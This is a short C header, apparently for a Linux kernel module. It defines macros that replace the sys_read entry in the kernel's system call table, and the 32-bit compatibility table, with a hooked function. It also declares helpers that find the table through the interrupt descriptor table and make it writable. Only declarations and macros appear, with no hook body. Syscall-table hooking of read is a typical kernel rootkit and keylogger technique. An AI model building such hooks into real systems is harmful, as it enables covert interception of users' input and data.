#include <linux/mm.h>
#include <linux/init.h>
#include <asm/uaccess.h>
#include <linux/sched.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/vmalloc.h>
#include <linux/proc_fs.h>

#include <asm/unistd.h>
#ifdef CONFIG_IA32_EMULATION
#include "unistd_32.h"
#endif

#define HOOK(F) real_sys_read = sys_call_table[F]; sys_call_table[F] = hooked_sys_read;
#ifdef CONFIG_IA32_EMULATION
	#define HOOK_IA32(F) ia32_sys_call_table[F] = hooked_sys_read;
#else
	#define HOOK_IA32(F)
#endif

#define UNHOOK(F) sys_call_table[F] = real_sys_read;
#ifdef CONFIG_IA32_EMULATION
	#define UNHOOK_IA32(F) ia32_sys_call_table[F] = real_sys_read;
#else
	#define UNHOOK_IA32(F)
#endif

extern void **sys_call_table;
#ifdef CONFIG_IA32_EMULATION
extern void **ia32_sys_call_table;
#endif

#ifdef __i386__
struct idt_descriptor{
	unsigned short offset_low;
	unsigned short selector;
	unsigned char zero;
	unsigned char type_flags;
	unsigned short offset_high;
} __attribute__ ((packed));
#elif defined(CONFIG_IA32_EMULATION)
struct idt_descriptor{
	unsigned short offset_low;
	unsigned short selector;
	unsigned char zero1;
	unsigned char type_flags;
	unsigned short offset_middle;
	unsigned int offset_high;
	unsigned int zero2;
} __attribute__ ((packed));
#endif

struct idtr{
	unsigned short limit;
	void *base;
} __attribute__ ((packed));

void *get_writable_sct(void *sct_addr);
#if defined(__i386__) || defined(CONFIG_IA32_EMULATION)
#ifdef __i386__
void *get_sys_call_table(void);
#elif defined(__x86_64__)
void *get_ia32_sys_call_table(void);
#endif
#endif

#ifdef __x86_64__
void *get_sys_call_table(void);
#endif

void hook_calls(void);
void unhook_calls(void);